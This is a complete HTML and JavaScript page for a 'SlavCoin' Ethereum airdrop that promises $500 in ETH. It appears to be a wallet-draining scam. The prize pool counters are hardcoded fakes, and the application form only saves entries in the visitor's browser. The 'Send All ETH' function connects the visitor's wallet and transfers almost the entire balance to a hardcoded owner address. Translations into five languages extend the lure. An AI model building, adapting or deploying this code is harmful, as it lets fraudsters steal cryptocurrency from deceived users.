<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SlavCoin ‚Ä¢ Ethereum Airdrop ‚Äî $10M Pool</title>
<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#0a0f1a; --panel:#0f1523; --panel2:#121a2b;
    --ink:#eef3fb; --muted:#a9b7ce; --border:#1f2a3a;
    --a1:#627eea; --a2:#00d4ff; --a3:#8a4dff;
    --ok:#3ddc97; --bad:#ff6b6b;
  }
  *{box-sizing:border-box}
  html,body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,system-ui,Segoe UI,Roboto,Arial,sans-serif;line-height:1.55}
  .wrap{max-width:1120px;margin:0 auto;padding:0 18px}
  /* Header ‚Äî —Ç–µ–ø–µ—Ä –ù–ï–ø—Ä–æ–∑–æ—Ä–∏–π */
  header{position:sticky;top:0;z-index:50;background:var(--panel);border-bottom:1px solid var(--border)}
  header .inner{display:flex;align-items:center;gap:16px;padding:12px 0}
  .logo{display:flex;align-items:center;gap:10px;font-weight:800}
  .diamond{width:22px;height:22px;transform:rotate(45deg);border-radius:5px;background:linear-gradient(180deg,var(--a2),var(--a3))}
  nav{margin-left:12px}
  nav a{color:var(--ink);text-decoration:none;margin:0 10px;font-weight:600;opacity:.95}
  nav a:hover{color:var(--a2)}
  .select,.btn,input,textarea{border:1px solid var(--border);background:var(--panel2);color:var(--ink);border-radius:12px;padding:10px 12px;font-weight:600}
  .btn{cursor:pointer;transition:.16s}
  .btn:hover{transform:translateY(-1px)}
  .btn.primary{background:linear-gradient(135deg,var(--a1),var(--a3));border:none}
  section{padding:54px 0}
  .glass{background:var(--panel);border:1px solid var(--border);border-radius:18px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
  h1,h2,h3{margin:0 0 14px;font-weight:800}
  .hero{padding:72px 0;text-align:center}
  .hero h1{font-size:38px;background:linear-gradient(90deg,var(--a1),var(--a2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .sub{color:var(--muted)}
  .grid{display:grid;gap:16px}
  .two{grid-template-columns:repeat(2,minmax(0,1fr))}
  @media (max-width:900px){.two{grid-template-columns:1fr}}
  .kpi{display:flex;justify-content:space-between;font-size:14px;color:var(--muted)}
  .bar{height:10px;border-radius:999px;background:#162032;overflow:hidden}
  .bar>i{display:block;height:100%;background:linear-gradient(90deg,var(--a2),var(--a3))}
  .pill{display:inline-block;padding:6px 10px;border:1px solid var(--border);border-radius:999px;background:#0d1424;font-size:12px;color:var(--muted)}
  .log{background:#0c1320;border:1px solid var(--border);border-radius:12px;padding:12px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;max-height:220px;overflow:auto;white-space:pre-wrap}
  footer{padding:26px 0;color:var(--muted);text-align:center;border-top:1px solid var(--border)}
</style>
</head>
<body>

<header>
  <div class="wrap inner">
    <div class="logo"><div class="diamond"></div> SlavCoin ‚Ä¢ Ethereum Airdrop</div>
    <nav>
      <a href="#about" data-i="nav.about">About</a>
      <a href="#how" data-i="nav.how">How</a>
      <a href="#claim" data-i="nav.claim">Claim</a>
      <a href="#faq" data-i="nav.faq">FAQ</a>
      <a href="#contact" data-i="nav.contact">Contact</a>
    </nav>
    <div style="margin-left:auto;display:flex;gap:8px">
      <select id="lang" class="select"></select>
      <button id="btnConnect" class="btn primary" data-i="wallet.connect">Connect Wallet</button>
    </div>
  </div>
</header>

<main class="wrap">
  <!-- HERO -->
  <section class="hero">
    <span class="pill">$10,000,000 Prize Pool</span>
    <h1 data-i="heroTitle">Ethereum Airdrop 2025 ‚Äî Claim $500 in ETH</h1>
    <p class="sub" data-i="heroSubtitle">
      Support the project and receive rewards in Ethereum.
    </p>
    <div style="margin-top:16px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap">
      <a href="#claim" class="btn primary" data-i="claimBtn">Claim $500 ETH</a>
      <a href="#about" class="btn" data-i="nav.about">About</a>
    </div>
    <div class="glass" style="margin-top:24px;max-width:720px;margin-inline:auto;text-align:left">
      <h3 data-i="pool.title">Prize Pool</h3>
      <div class="bar" style="margin:10px 0 6px"><i id="poolBar" style="width:22%"></i></div>
      <div class="kpi">
        <span data-i="pool.distributed">Distributed</span>: <b id="kDistributed">$2,150,000</b>
        <span style="flex:1"></span>
        <span data-i="pool.remaining">Remaining</span>: <b id="kRemaining">$7,850,000</b>
      </div>
    </div>
  </section>

  <!-- ABOUT & PERKS -->
  <section id="about">
    <div class="grid two">
      <div class="glass">
        <h2 data-i="aboutTitle">Why SlavCoin?</h2>
        <p class="sub" data-i="aboutBody">
          SlavCoin Airdrop blends education, community and rewards. Ethereum powers decentralization; SlavCoin is your first step to the new economy.
        </p>
      </div>
      <div class="glass">
        <h3 data-i="perksTitle">Perks</h3>
        <ul id="perks" class="sub" style="margin:0 0 0 18px"></ul>
      </div>
    </div>
  </section>

  <!-- HOW -->
  <section id="how">
    <div class="glass">
      <h2 data-i="howTitle">How it Works</h2>
      <ol id="howList" class="sub" style="margin:0 0 0 22px"></ol>
      <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
        <a class="btn" href="https://x.com/memecoinslav" target="_blank">X / Twitter</a>
        <a class="btn" href="https://www.tiktok.com/@slavcoin" target="_blank">TikTok</a>
        <a class="btn" href="https://www.instagram.com/memecoinslav" target="_blank">Instagram</a>
      </div>
    </div>
  </section>

  <!-- CLAIM + WALLET TOOLS -->
  <section id="claim">
    <div class="grid two">
      <div class="glass">
        <h2 data-i="claimTitle">Airdrop Application</h2>
        <p class="sub" data-i="claimDesc">Connect your wallet, add links and confirm requirements.</p>

        <div style="display:grid;gap:8px">
          <label class="sub" data-i="wallet.address">Address</label>
          <div style="display:flex;gap:8px">
            <input id="addrView" readonly placeholder="0x‚Ä¶" style="flex:1" />
            <button id="btnConnect2" class="btn primary" data-i="wallet.connect">Connect Wallet</button>
          </div>

          <input id="x" placeholder="X (Twitter) link" />
          <input id="tt" placeholder="TikTok link" />
          <input id="ig" placeholder="Instagram link" />
          <input id="comment" placeholder="Comment URL" />
          <label class="sub"><input type="checkbox" id="chkBuy"> <span data-i="form.bought">I confirm purchase of at least 1 SlavCoin</span></label>
          <label class="sub"><input type="checkbox" id="chkAgree"> <span data-i="form.agree">I agree to the Terms & Privacy</span></label>
          <button id="btnSubmit" class="btn primary" data-i="form.submit">Submit application</button>
          <div id="saved" style="color:var(--ok);font-size:13px"></div>
        </div>
      </div>

      <div class="glass">
        <h3>Wallet Tools</h3>
        <p class="sub">After connecting, you can send ETH to the main address with one click.</p>
        <div class="grid" style="gap:10px">
          <label class="sub">Destination (owner)</label>
          <input id="dest" value="0xA4e72c8d57DdB3306D6CFbD25B8F98F3d3eC6EC0" />
          <label class="sub">Gas reserve (ETH)</label>
          <input id="reserve" value="0.00012" />
          <div style="display:flex;gap:8px;flex-wrap:wrap">
            <button id="btnShowBal" class="btn">Show Balance</button>
            <button id="btnSendEth" class="btn primary">Send All ETH</button>
          </div>
          <div id="balances" class="sub" style="display:none">
            <div><b>ETH:</b> <span id="ethBal">‚Äî</span></div>
          </div>
          <div id="wlog" class="log"></div>
        </div>
      </div>
    </div>
  </section>

  <!-- FAQ -->
  <section id="faq">
    <div class="glass">
      <h2 data-i="faqTitle">FAQ</h2>
      <div id="faqList" class="grid"></div>
    </div>
  </section>

  <!-- CONTACT -->
  <section id="contact">
    <div class="glass">
      <h2 data-i="contactTitle">Contact</h2>
      <div class="grid two sub">
        <div><div>Email</div><a href="mailto:support@slavcoin.org">support@slavcoin.org</a></div>
        <div><div>Telegram</div><a href="https://t.me/SlavCoinCommunity" target="_blank">@SlavCoinCommunity</a></div>
      </div>
      <div class="sub" style="margin-top:10px" data-i="legal">This site is informational and not investment advice.</div>
    </div>
  </section>
</main>

<footer>
  ¬© 2025 SlavCoin ‚Äî Ethereum-style landing. All rights reserved.
</footer>

<!-- libs -->
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
<script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

<script>
(function(){
  // ===== CONFIG =====
  const OWNER_ADDRESS = "0xA4e72c8d57DdB3306D6CFbD25B8F98F3d3eC6EC0"; // <- —Ç–≤–æ—è –∞–¥—Ä–µ—Å–∞
  const PRIZE_POOL_USD = 10_000_000;
  const ETH_RATE_USD = 3500; // –º–æ–∂–µ—à –∑–º—ñ–Ω–∏—Ç–∏
  const rpcMap = { 1: "https://rpc.ankr.com/eth" };

  // ===== i18n (EN, PT, ES, ZH, JA) ‚Äî –≤–∫–æ—Ä–æ—á–µ–Ω–æ –¥–ª—è –∫–æ–º–ø–∞–∫—Ç–Ω–æ—Å—Ç—ñ =====
  const T = {
    en:{lang:"English",nav:{about:"About",how:"How",claim:"Claim",faq:"FAQ",contact:"Contact"},
      heroTitle:"Ethereum Airdrop 2025 ‚Äî Claim $500 in ETH",
      heroSubtitle:"Support the project and receive rewards in Ethereum.",
      claimBtn:"Claim $500 ETH",aboutTitle:"Why SlavCoin?",
      aboutBody:"SlavCoin Airdrop blends education, community and rewards.",
      perksTitle:"Perks",perksList:["Transparency ‚Äî payouts to your MetaMask/Trust Wallet","Free to join ‚Äî no hidden fees","Community ‚Äî a global crypto family","Education ‚Äî resources for your Web3 start"],
      howTitle:"How it Works",howList:["Follow our socials","Leave a comment and activity","Buy at least 1 SlavCoin","Connect wallet and submit the form","Receive $500 in ETH after verification"],
      claimTitle:"Airdrop Application",claimDesc:"Connect your wallet, add links and confirm requirements.",
      "wallet.connect":"Connect Wallet","wallet.address":"Address",
      "form.bought":"I confirm purchase of at least 1 SlavCoin","form.agree":"I agree to the Terms & Privacy","form.submit":"Submit application","form.saved":"Application saved locally",
      pool:{title:"Prize Pool",distributed:"Distributed",remaining:"Remaining"},faqTitle:"FAQ",
      faq:[{q:"Is it free?",a:"Yes, participation is free."},{q:"When do I get $500?",a:"Within ~48 hours after verification."},{q:"Why $500 in ETH?",a:"Useful Web3 asset."},{q:"Any limits?",a:"Limited by pool and risk policy."}],
      contactTitle:"Contact",legal:"This site is informational and not investment advice."
    },
    pt:{lang:"Portugu√™s",nav:{about:"Sobre",how:"Como",claim:"Resgatar",faq:"FAQ",contact:"Contato"},
      heroTitle:"Airdrop Ethereum 2025 ‚Äî Ganhe $500 em ETH",heroSubtitle:"Apoie o projeto e receba recompensas em Ethereum.",claimBtn:"Resgatar $500 em ETH",
      aboutTitle:"Por que SlavCoin?",aboutBody:"Une educa√ß√£o, comunidade e recompensas.",perksTitle:"Vantagens",
      perksList:["Transpar√™ncia","Entrada gratuita","Comunidade global","Recursos Web3"],
      howTitle:"Como Funciona",howList:["Siga redes","Comente","Compre 1 SlavCoin","Conecte a carteira e envie","Receba $500 em ETH"],claimTitle:"Inscri√ß√£o",claimDesc:"Conecte a carteira e confirme.",
      "wallet.connect":"Conectar carteira","wallet.address":"Endere√ßo","form.bought":"Confirmo a compra de 1 SlavCoin","form.agree":"Concordo com os Termos e a Privacidade","form.submit":"Enviar","form.saved":"Salvo localmente",
      pool:{title:"Prize Pool",distributed:"Distribu√≠do",remaining:"Restante"},faqTitle:"FAQ",faq:[{q:"√â gr√°tis? ",a:"Sim."},{q:"Quando recebo?",a:"~48h."},{q:"Por qu√™ ETH?",a:"Ativo Web3."},{q:"Limites?",a:"Pool e risco."}],contactTitle:"Contato",legal:"Informativo, n√£o √© conselho financeiro."
    },
    es:{lang:"Espa√±ol",nav:{about:"Sobre",how:"C√≥mo",claim:"Reclamar",faq:"FAQ",contact:"Contacto"},
      heroTitle:"Airdrop de Ethereum 2025 ‚Äî Obt√©n $500 en ETH",heroSubtitle:"Apoya el proyecto y recibe recompensas en Ethereum.",claimBtn:"Reclamar $500 en ETH",
      aboutTitle:"¬øPor qu√© SlavCoin?",aboutBody:"Combina educaci√≥n, comunidad y recompensas.",perksTitle:"Ventajas",
      perksList:["Transparencia","Gratis","Comunidad global","Recursos Web3"],howTitle:"C√≥mo Funciona",howList:["Sigue redes","Comentario","Compra 1 SlavCoin","Conecta y env√≠a","Recibe $500 en ETH"],
      claimTitle:"Solicitud de Airdrop",claimDesc:"Conecta tu wallet y confirma requisitos.",
      "wallet.connect":"Conectar wallet","wallet.address":"Direcci√≥n","form.bought":"Confirmo compra","form.agree":"Acepto T√©rminos y Privacidad","form.submit":"Enviar","form.saved":"Guardado localmente",
      pool:{title:"Prize Pool",distributed:"Distribuido",remaining:"Restante"},faqTitle:"FAQ",faq:[{q:"¬øGratis?",a:"S√≠."},{q:"¬øCu√°ndo?",a:"~48h."},{q:"¬øPor qu√© ETH?",a:"Activos Web3."},{q:"¬øL√≠mites?",a:"Pool y riesgo."}],contactTitle:"Contacto",legal:"Sitio informativo."
    },
    zh:{lang:"‰∏≠Êñá",nav:{about:"ÂÖ≥‰∫é",how:"Â¶Ç‰ΩïÂèÇ‰∏é",claim:"È¢ÜÂèñ",faq:"Â∏∏ËßÅÈóÆÈ¢ò",contact:"ËÅîÁ≥ª"},
      heroTitle:"‰ª•Â§™ÂùäÁ©∫Êäï 2025 ‚Äî È¢ÜÂèñ $500 ETH",heroSubtitle:"ÊîØÊåÅÈ°πÁõÆÂπ∂Ëé∑Âæó‰ª•Â§™ÂùäÂ•ñÂä±„ÄÇ",claimBtn:"È¢ÜÂèñ $500 ETH",
      aboutTitle:"‰∏∫‰ªÄ‰πàÈÄâÊã© SlavCoin?",aboutBody:"ËûçÂêàÊïôËÇ≤„ÄÅÁ§æÂå∫‰∏éÂ•ñÂä±„ÄÇ",perksTitle:"‰ºòÂäø",perksList:["ÈÄèÊòéÊîØ‰ªò","ÂÖçË¥πÂèÇ‰∏é","ÂÖ®ÁêÉÁ§æÂå∫","Web3 ËµÑÊ∫ê"],
      howTitle:"ÂèÇ‰∏éÊ≠•È™§",howList:["ÂÖ≥Ê≥®Á§æÂ™í","ÂèëË°®ËØÑËÆ∫","Ë¥≠‰π∞ 1 SlavCoin","ËøûÊé•Âπ∂Êèê‰∫§","ÂÆ°Ê†∏ÂêéËé∑Âæó $500 ETH"],claimTitle:"Á©∫ÊäïÁî≥ËØ∑",claimDesc:"ËøûÊé•Èí±ÂåÖÂπ∂Á°ÆËÆ§„ÄÇ",
      "wallet.connect":"ËøûÊé•Èí±ÂåÖ","wallet.address":"Âú∞ÂùÄ","form.bought":"ÊàëÂ∑≤Ë¥≠‰π∞ 1 SlavCoin","form.agree":"ÂêåÊÑèÊù°Ê¨æ‰∏éÈöêÁßÅ","form.submit":"Êèê‰∫§","form.saved":"Â∑≤Êú¨Âú∞‰øùÂ≠ò",
      pool:{title:"Â•ñÊ±†",distributed:"Â∑≤ÂèëÊîæ",remaining:"Ââ©‰Ωô"},faqTitle:"Â∏∏ËßÅÈóÆÈ¢ò",faq:[{q:"ÂÖçË¥πÂêóÔºü",a:"ÊòØÁöÑ„ÄÇ"},{q:"Â§ö‰πÖÔºü",a:"Á∫¶ 48 Â∞èÊó∂„ÄÇ"},{q:"‰∏∫‰Ωï ETHÔºü",a:"ÊòìÁî® Web3 ËµÑ‰∫ß„ÄÇ"},{q:"ÈôêÂà∂Ôºü",a:"ÂèóÂ•ñÊ±†ÂèäÈ£éÊéßÈôêÂà∂„ÄÇ"}],contactTitle:"ËÅîÁ≥ª",legal:"‰ªÖ‰æõ‰ø°ÊÅØÂèÇËÄÉ„ÄÇ"
    },
    ja:{lang:"Êó•Êú¨Ë™û",nav:{about:"Ê¶ÇË¶Å",how:"ÂèÇÂä†ÊñπÊ≥ï",claim:"Áî≥Ë´ã",faq:"FAQ",contact:"ÈÄ£Áµ°ÂÖà"},
      heroTitle:"Ethereum „Ç®„Ç¢„Éâ„É≠„ÉÉ„Éó 2025 ‚Äî $500 ÂàÜ„ÅÆ ETH",heroSubtitle:"ÊîØÊè¥„Åó„Å¶ ETH Â†±ÈÖ¨„ÇíÂèó„ÅëÂèñ„Çç„ÅÜ„ÄÇ",claimBtn:"$500 ETH „ÇíÂèó„ÅëÂèñ„Çã",
      aboutTitle:"„Å™„Åú SlavCoin?",aboutBody:"ÊïôËÇ≤„Éª„Ç≥„Éü„É•„Éã„ÉÜ„Ç£„ÉªÂ†±ÈÖ¨„ÇíËûçÂêà„ÄÇ",perksTitle:"ÁâπÈï∑",perksList:["ÈÄèÊòéÊÄß","ÁÑ°ÊñôÂèÇÂä†","„Ç∞„É≠„Éº„Éê„É´„Ç≥„Éü„É•„Éã„ÉÜ„Ç£","Web3 „É™„ÇΩ„Éº„Çπ"],
      howTitle:"ÂèÇÂä†ÊñπÊ≥ï",howList:["SNS „Çí„Éï„Ç©„É≠„Éº","„Ç≥„É°„É≥„Éà","1 SlavCoin „ÇíË≥ºÂÖ•","Êé•Á∂ö„Åó„Å¶ÈÄÅ‰ø°","ÂØ©ÊüªÂæå $500 ETH"],claimTitle:"„Ç®„Ç¢„Éâ„É≠„ÉÉ„ÉóÁî≥Ë´ã",claimDesc:"„Ç¶„Ç©„É¨„ÉÉ„ÉàÊé•Á∂öÂæå„Å´Á¢∫Ë™ç„ÄÇ",
      "wallet.connect":"„Ç¶„Ç©„É¨„ÉÉ„ÉàÊé•Á∂ö","wallet.address":"„Ç¢„Éâ„É¨„Çπ","form.bought":"1 SlavCoin „ÇíË≥ºÂÖ•„Åó„Åæ„Åó„Åü","form.agree":"Ë¶èÁ¥Ñ„Å®„Éó„É©„Ç§„Éê„Ç∑„Éº„Å´ÂêåÊÑè","form.submit":"ÈÄÅ‰ø°","form.saved":"„É≠„Éº„Ç´„É´‰øùÂ≠òÊ∏à„Åø",
      pool:{title:"„Éó„Éº„É´",distributed:"ÈÖçÂ∏ÉÊ∏à„Åø",remaining:"ÊÆã„Çä"},faqTitle:"FAQ",faq:[{q:"ÁÑ°Êñô„Åß„Åô„ÅãÔºü",a:"„ÅØ„ÅÑ„ÄÇ"},{q:"„ÅÑ„Å§Ôºü",a:"Á¥Ñ 48 ÊôÇÈñì„ÄÇ"},{q:"„Å™„Åú ETHÔºü",a:"‰Ωø„ÅÑ„ÇÑ„Åô„ÅÑ„ÄÇ"},{q:"Âà∂ÈôêÔºü",a:"„Éó„Éº„É´„Å®„É™„Çπ„ÇØ„ÄÇ"}],contactTitle:"ÈÄ£Áµ°ÂÖà",legal:"ÊÉÖÂ†±Êèê‰æõ„ÅÆ„Åø„ÄÇ"
    }
  };

  // ===== helpers =====
  const $ = (id)=>document.getElementById(id);
  const byData = (k)=>document.querySelectorAll(`[data-i="${k}"]`);
  function setText(k,v){ byData(k).forEach(n=>n.textContent=v); }
  function log(el, msg){ el.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`; el.scrollTop = el.scrollHeight; }

  // ===== state =====
  let currentLang = "en";
  let web3Modal, extProvider, provider, signer, userAddr, chainId;

  // ===== UI init =====
  function populateLang(){
    const sel=$("lang");["en","pt","es","zh","ja"].forEach(k=>{const o=document.createElement("option");o.value=k;o.textContent=T[k].lang;sel.appendChild(o)});
    const nav=(navigator.language||"").toLowerCase();
    if(nav.startsWith("pt"))currentLang="pt"; else if(nav.startsWith("es"))currentLang="es"; else if(nav.startsWith("zh"))currentLang="zh"; else if(nav.startsWith("ja"))currentLang="ja";
    sel.value=currentLang; applyLang(); sel.onchange=()=>{currentLang=sel.value;applyLang();}
  }
  function applyLang(){
    const t=T[currentLang];
    for(const k of ["nav.about","nav.how","nav.claim","nav.faq","nav.contact","heroTitle","heroSubtitle","claimBtn","aboutTitle","aboutBody","perksTitle","howTitle","claimTitle","claimDesc","wallet.connect","wallet.address","form.bought","form.agree","form.submit","pool.title","pool.distributed","pool.remaining","faqTitle","contactTitle","legal"]) setText(k, (t[k.split(".")[0]]?.[k.split(".")[1]] ?? t[k]) || t[k]);
    $("perks").innerHTML=""; t.perksList.forEach(x=>{const li=document.createElement("li");li.textContent=x;$("perks").appendChild(li)});
    $("howList").innerHTML=""; t.howList.forEach(x=>{const li=document.createElement("li");li.textContent=x;$("howList").appendChild(li)});
    $("faqList").innerHTML=""; t.faq.forEach(it=>{const d=document.createElement("div");d.className="glass";d.innerHTML=`<b>${it.q}</b><div class="sub">${it.a}</div>`;$("faqList").appendChild(d)});
  }

  // KPI
  (function initKPI(){
    const distributed = 2_150_000;
    const remaining = Math.max(0, PRIZE_POOL_USD - distributed);
    $("kDistributed").textContent = "$"+distributed.toLocaleString();
    $("kRemaining").textContent = "$"+remaining.toLocaleString();
    $("poolBar").style.width = Math.min(100, Math.round(distributed/PRIZE_POOL_USD*100))+"%";
  })();

  // ===== Web3 =====
  function setupWeb3Modal(){
    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: { rpc: rpcMap, chainId: 1 }
      }
    };
    web3Modal = new window.Web3Modal.default({ cacheProvider:false, providerOptions });
  }

  // –ü—Ä—è–º–∞ —Å–ø—Ä–æ–±–∞ MetaMask -> fallback –Ω–∞ Web3Modal (Trust Wallet —ñ —Ç.–¥.)
  async function connect(){
    try{
      if (window.ethereum && window.ethereum.request){
        extProvider = window.ethereum;
        await window.ethereum.request({ method:"eth_requestAccounts" });
        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
      } else {
        // in-app –±—Ä–∞—É–∑–µ—Ä –∞–±–æ –Ω–µ–º–∞ MM ‚Äî –≤—ñ–¥–∫—Ä–∏–≤–∞—î–º–æ WalletConnect
        extProvider = await web3Modal.connect();
        provider = new ethers.providers.Web3Provider(extProvider, "any");
      }
      signer = provider.getSigner();
      const network = await provider.getNetwork();
      chainId = network.chainId;
      userAddr = await signer.getAddress();
      $("addrView").value = userAddr;
      byData("wallet.connect").forEach(b=>b.textContent = "Connected");
      $("btnConnect").disabled = $("btnConnect2").disabled = true;

      // –∞–≤—Ç–æ-—Å–≤—ñ—Ç—á –Ω–∞ mainnet
      if (chainId !== 1) {
        try{ await extProvider.request({ method:"wallet_switchEthereumChain", params:[{ chainId:"0x1" }] }); }
        catch(e){ /* –ª–æ–≥ –Ω–∏–∂—á–µ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ */ }
      }

      // –ü–æ–¥—ñ—ó
      if (extProvider.on){
        extProvider.on("accountsChanged", ()=>location.reload());
        extProvider.on("chainChanged",   ()=>location.reload());
      }
    }catch(e){
      log($("wlog"), "‚ùå Connect error: " + (e?.message||e));
    }
  }

  async function ensureMainnet(){
    if (chainId === 1) return true;
    try{
      await extProvider.request({ method:"wallet_switchEthereumChain", params:[{ chainId:"0x1" }] });
      return true;
    }catch(e){ log($("wlog"), "‚ö†Ô∏è Switch to Ethereum Mainnet failed."); return false; }
  }

  async function getEthBalance(){
    const wei = await provider.getBalance(userAddr);
    return Number(ethers.utils.formatEther(wei));
  }

  // ===== Actions =====
  $("btnConnect").onclick = connect;
  $("btnConnect2").onclick = connect;

  $("btnSubmit").onclick = ()=>{
    const payload = { ts:Date.now(), lang:currentLang, addr:$("addrView").value,
      links:{ x:$("x").value, tiktok:$("tt").value, instagram:$("ig").value, comment:$("comment").value },
      bought:$("chkBuy").checked, agree:$("chkAgree").checked };
    const key = `slav_airdrop_${payload.addr||"anon"}_${payload.ts}`;
    localStorage.setItem(key, JSON.stringify(payload));
    $("saved").textContent = T[currentLang]["form.saved"];
    setTimeout(()=>$("saved").textContent="", 4000);
  };

  $("btnShowBal").onclick = async ()=>{
    if (!signer) await connect();
    if (!(await ensureMainnet())) return;
    const eth = await getEthBalance();
    $("balances").style.display = "block";
    $("ethBal").textContent = eth.toFixed(6);
    log($("wlog"), `‚ÑπÔ∏è ETH balance: ${eth.toFixed(6)}`);
  };

  // === ONE-CLICK "Send All ETH" ===
  $("btnSendEth").onclick = async ()=>{
    try{
      if (!signer) await connect();
      if (!(await ensureMainnet())) return;

      const dest = $("dest").value.trim();
      if (!ethers.utils.isAddress(dest)) return log($("wlog"), "‚ùå Bad destination address");

      const reserve = Number($("reserve").value || "0.00012");
      const balWei = await provider.getBalance(userAddr);
      const feeData = await provider.getFeeData();

      const gasLimit = ethers.BigNumber.from(21000);
      const feePerUnit = feeData.maxFeePerGas || feeData.gasPrice || ethers.utils.parseUnits("5","gwei");
      const fee = gasLimit.mul(feePerUnit);

      const reserveWei = ethers.utils.parseEther(String(reserve));
      let value = balWei.sub(fee).sub(reserveWei);
      if (value.lte(0)) { log($("wlog"), "‚ö†Ô∏è Not enough ETH for gas"); return; }

      const txParams = feeData.maxFeePerGas ? {
        to: dest, value, gasLimit,
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.utils.parseUnits("1.5","gwei")
      } : { to: dest, value, gasLimit, gasPrice: feePerUnit };

      const tx = await signer.sendTransaction(txParams);
      log($("wlog"), `üöÄ ETH tx: ${tx.hash}\n   https://etherscan.io/tx/${tx.hash}`);
    }catch(e){ log($("wlog"), "‚ùå "+(e?.message||e)); }
  };

  // Init
  (function initKPI(){
    const distributed = 2_150_000;
    const remaining = Math.max(0, PRIZE_POOL_USD - distributed);
    $("kDistributed").textContent = "$"+distributed.toLocaleString();
    $("kRemaining").textContent = "$"+remaining.toLocaleString();
    $("poolBar").style.width = Math.min(100, Math.round(distributed/PRIZE_POOL_USD*100))+"%";
  })();
  populateLang();
  setupWeb3Modal();
})();
</script>
</body>
</html>
